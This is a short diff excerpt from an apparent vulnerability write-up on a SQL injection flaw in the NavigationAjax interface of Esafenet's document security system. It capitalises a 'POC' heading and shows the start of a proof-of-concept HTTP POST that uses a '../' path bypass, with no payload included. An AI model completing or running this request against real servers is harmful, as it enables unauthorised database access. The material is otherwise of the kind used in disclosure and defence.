@@ -1,7 +1,7 @@
 ## 亿赛通电子文档安全管理系统NavigationAjax接口存在SQL注入漏洞
 
 
-## poc
+## POC
 ```
 POST /CDGServer3/js/../NavigationAjax HTTP/1.1
 Host: 
